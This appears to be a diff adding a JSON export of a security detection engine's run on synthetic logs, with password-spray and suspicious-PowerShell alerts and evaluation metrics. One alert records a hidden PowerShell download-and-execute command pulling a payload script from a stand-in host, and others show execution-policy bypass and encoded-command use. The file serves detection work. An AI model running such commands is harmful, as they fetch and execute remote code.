@@ -1,0 +1,260 @@
+{
+  "generatedAt": "2026-11-23T05:04:16Z",
+  "source": "SentinelForge Python detection engine (v0.1.0)",
+  "note": "All data below is exported from a real run of the SentinelForge Python CLI against a synthetic JSON dataset. Results are precomputed and clearly labeled as synthetic. No real logs, no production SOC data, no local database access.",
+  "ingestSummary": {
+    "filesProcessed": 1,
+    "eventsNormalized": 22,
+    "eventsStored": 22,
+    "duplicatesSkipped": 0,
+    "recordsRejected": 0
+  },
+  "detectSummary": {
+    "eventsEvaluated": 22,
+    "detectionAlerts": 5,
+    "alertsStored": 5
+  },
+  "detections": [
+    {
+      "detectionId": "det-edbec0943d06470f",
+      "ruleId": "sentinelforge.detection.password_spray",
+      "ruleName": "Password Spray",
+      "severity": "high",
+      "description": "5 failed authentication attempts from 203.0.113.45 against 4 distinct username(s) within 3600s (username threshold 3)",
+      "mitreAttackTechnique": "T1110.003",
+      "mitreAttackTactic": "Credential Access",
+      "mitreAttackTacticId": "TA0006",
+      "evidenceCount": 5,
+      "host": "10.0.1.50",
+      "sourceAddress": "203.0.113.45",
+      "distinctUsernameCount": 4,
+      "targetedUsernames": ["admin", "root", "test", "guest"],
+      "totalAttempts": 5,
+      "windowSeconds": 3600,
+      "firstTimestamp": "2026-01-15T03:12:01+00:00",
+      "lastTimestamp": "2026-01-15T03:12:09+00:00",
+      "investigationRecommendations": [
+        "Check for successful logins from source IP against targeted accounts",
+        "Force password reset for targeted accounts",
+        "Review account lockout thresholds"
+      ],
+      "syntheticEvidence": [
+        {
+          "eventId": "synth-001",
+          "eventType": "auth.login.failure",
+          "user": "admin",
+          "host": "10.0.1.50",
+          "sourceAddress": "203.0.113.45",
+          "rawLog": "2026-01-15T03:12:01Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=admin reason=invalid_password"
+        },
+        {
+          "eventId": "synth-002",
+          "eventType": "auth.login.failure",
+          "user": "admin",
+          "host": "10.0.1.50",
+          "sourceAddress": "203.0.113.45",
+          "rawLog": "2026-01-15T03:12:03Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=admin reason=invalid_password"
+        },
+        {
+          "eventId": "synth-003",
+          "eventType": "auth.login.failure",
+          "user": "root",
+          "host": "10.0.1.50",
+          "sourceAddress": "203.0.113.45",
+          "rawLog": "2026-01-15T03:12:05Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=root reason=invalid_password"
+        },
+        {
+          "eventId": "synth-004",
+          "eventType": "auth.login.failure",
+          "user": "test",
+          "host": "10.0.1.50",
+          "sourceAddress": "203.0.113.45",
+          "rawLog": "2026-01-15T03:12:07Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=test reason=invalid_password"
+        },
+        {
+          "eventId": "synth-005",
+          "eventType": "auth.login.failure",
+          "user": "guest",
+          "host": "10.0.1.50",
+          "sourceAddress": "203.0.113.45",
+          "rawLog": "2026-01-15T03:12:09Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=guest reason=invalid_password"
+        }
+      ]
+    },
+    {
+      "detectionId": "det-d3322cdbf9c241dc",
+      "ruleId": "sentinelforge.detection.password_spray",
+      "ruleName": "Password Spray",
+      "severity": "high",
+      "description": "5 failed authentication attempts from 198.51.100.77 against 5 distinct username(s) within 3600s (username threshold 3)",
+      "mitreAttackTechnique": "T1110.003",
+      "mitreAttackTactic": "Credential Access",
+      "mitreAttackTacticId": "TA0006",
+      "evidenceCount": 5,
+      "host": "10.0.1.100",
+      "sourceAddress": "198.51.100.77",
+      "distinctUsernameCount": 5,
+      "targetedUsernames": ["alice", "bob", "charlie", "diana", "eve"],
+      "totalAttempts": 5,
+      "windowSeconds": 3600,
+      "firstTimestamp": "2026-01-16T04:05:11+00:00",
+      "lastTimestamp": "2026-01-16T04:05:27+00:00",
+      "investigationRecommendations": [
+        "Check for successful logins from source IP against targeted accounts",
+        "Force password reset for targeted accounts",
+        "Review account lockout thresholds"
+      ],
+      "syntheticEvidence": [
+        {
+          "eventId": "synth-006",
+          "eventType": "auth.login.failure",
+          "user": "alice",
+          "host": "10.0.1.100",
+          "sourceAddress": "198.51.100.77",
+          "rawLog": "2026-01-16T04:05:11Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=alice reason=invalid_password"
+        },
+        {
+          "eventId": "synth-007",
+          "eventType": "auth.login.failure",
+          "user": "bob",
+          "host": "10.0.1.100",
+          "sourceAddress": "198.51.100.77",
+          "rawLog": "2026-01-16T04:05:15Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=bob reason=invalid_password"
+        },
+        {
+          "eventId": "synth-008",
+          "eventType": "auth.login.failure",
+          "user": "charlie",
+          "host": "10.0.1.100",
+          "sourceAddress": "198.51.100.77",
+          "rawLog": "2026-01-16T04:05:19Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=charlie reason=invalid_password"
+        },
+        {
+          "eventId": "synth-009",
+          "eventType": "auth.login.failure",
+          "user": "diana",
+          "host": "10.0.1.100",
+          "sourceAddress": "198.51.100.77",
+          "rawLog": "2026-01-16T04:05:23Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=diana reason=invalid_password"
+        },
+        {
+          "eventId": "synth-010",
+          "eventType": "auth.login.failure",
+          "user": "eve",
+          "host": "10.0.1.100",
+          "sourceAddress": "198.51.100.77",
+          "rawLog": "2026-01-16T04:05:27Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=eve reason=invalid_password"
+        }
+      ]
+    },
+    {
+      "detectionId": "det-b2e00cb8ab104605",
+      "ruleId": "sentinelforge.detection.suspicious_powershell",
+      "ruleName": "Suspicious PowerShell",
+      "severity": "high",
+      "description": "Suspicious PowerShell (powershell.exe) with 1 indicator(s): download_and_execute (weight 6, threshold 4)",
+      "mitreAttackTechnique": "T1059.001",
+      "mitreAttackTactic": "Execution",
+      "mitreAttackTacticId": "TA0002",
+      "evidenceCount": 1,
+      "host": "10.0.1.75",
+      "user": "jdoe",
+      "processName": "powershell.exe",
+      "commandLine": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')",
+      "indicators": ["download_and_execute"],
+      "investigationRecommendations": [
+        "Decode encoded commands",
+        "Check user account activity",
+        "Review PowerShell transcription logs",
+        "Isolate host if command is malicious"
+      ],
+      "syntheticEvidence": [
+        {
+          "eventId": "synth-014",
+          "eventType": "process.create",
+          "user": "jdoe",
+          "host": "10.0.1.75",
+          "rawLog": "2026-01-18T14:45:04Z process.create parent=cmd.exe pid=4812 child=powershell.exe pid=5120 user=jdoe host=10.0.1.75"
+        }
+      ]
+    },
+    {
+      "detectionId": "det-b46298faae2d41b8",
+      "ruleId": "sentinelforge.detection.suspicious_powershell",
+      "ruleName": "Suspicious PowerShell",
+      "severity": "high",
+      "description": "Suspicious PowerShell (powershell.exe) with 1 indicator(s): execution_policy_bypass (weight 6, threshold 4)",
+      "mitreAttackTechnique": "T1059.001",
+      "mitreAttackTactic": "Execution",
+      "mitreAttackTacticId": "TA0002",
+      "evidenceCount": 1,
+      "host": "10.0.1.200",
+      "user": "svc_deploy",
+      "processName": "powershell.exe",
+      "commandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\\\Temp\\\\update.ps1",
+      "indicators": ["execution_policy_bypass"],
+      "investigationRecommendations": [
+        "Decode encoded commands",
+        "Check user account activity",
+        "Review PowerShell transcription logs",
+        "Isolate host if command is malicious"
+      ],
+      "syntheticEvidence": [
+        {
+          "eventId": "synth-012",
+          "eventType": "process.create",
+          "user": "svc_deploy",
+          "host": "10.0.1.200",
+          "rawLog": "2026-01-17T09:22:35Z process.create user=svc_deploy host=10.0.1.200 cmd=powershell.exe -ExecutionPolicy Bypass -File C:\\\\Temp\\\\update.ps1"
+        }
+      ]
+    },
+    {
+      "detectionId": "det-46c84b06a3894033",
+      "ruleId": "sentinelforge.detection.suspicious_powershell",
+      "ruleName": "Suspicious PowerShell",
+      "severity": "high",
+      "description": "Suspicious PowerShell (powershell.exe) with 1 indicator(s): encoded_command (weight 6, threshold 4)",
+      "mitreAttackTechnique": "T1059.001",
+      "mitreAttackTactic": "Execution",
+      "mitreAttackTacticId": "TA0002",
+      "evidenceCount": 1,
+      "host": "10.0.1.200",
+      "user": "svc_deploy",
+      "processName": "powershell.exe",
+      "commandLine": "powershell.exe -EncodedCommand SQBuAHQAbwByAHQALQBFAGYAZgBlAGMAdAAgAEYAbwByAGQAZQByAGcAGUA",
+      "indicators": ["encoded_command"],
+      "investigationRecommendations": [
+        "Decode encoded commands",
+        "Check user account activity",
+        "Review PowerShell transcription logs",
+        "Isolate host if command is malicious"
+      ],
+      "syntheticEvidence": [
+        {
+          "eventId": "synth-011",
+          "eventType": "process.create",
+          "user": "svc_deploy",
+          "host": "10.0.1.200",
+          "rawLog": "2026-01-17T09:22:33Z process.create user=svc_deploy host=10.0.1.200 cmd=powershell.exe -EncodedCommand SQBuAHQAbwByAHQALQBFAGYAZgBlAGMAdAAgAEYAbwByAGQAZQByAGcAGUA"
+        }
+      ]
+    }
+  ],
+  "evaluation": {
+    "datasetSize": 54,
+    "suspiciousGroundTruth": 30,
+    "benignGroundTruth": 24,
+    "totalDetected": 48,
+    "truePositives": 30,
+    "falsePositives": 18,
+    "falseNegatives": 0,
+    "precision": 0.6250,
+    "recall": 1.0000,
+    "f1Score": 0.7692,
+    "falsePositiveRate": 0.7500,
+    "falseNegativeRate": 0.0000,
+    "methodology": "Event-level evaluation using ground-truth labeled synthetic events. TP = suspicious events with at least one matching detection. FP = benign events flagged by at least one detection. FN = suspicious events with no matching detection. C2BeaconRule flags benign periodic HTTPS traffic (software updates, EDR heartbeats) which accounts for the false positives.",
+    "limitation": "C2BeaconRule cannot reliably distinguish benign periodic traffic (software updates, EDR heartbeats, monitoring telemetry) from low-frequency C2 beaconing. Both produce regular periodic connections. Analyst investigation with destination reputation and process context is required."
+  }
+}
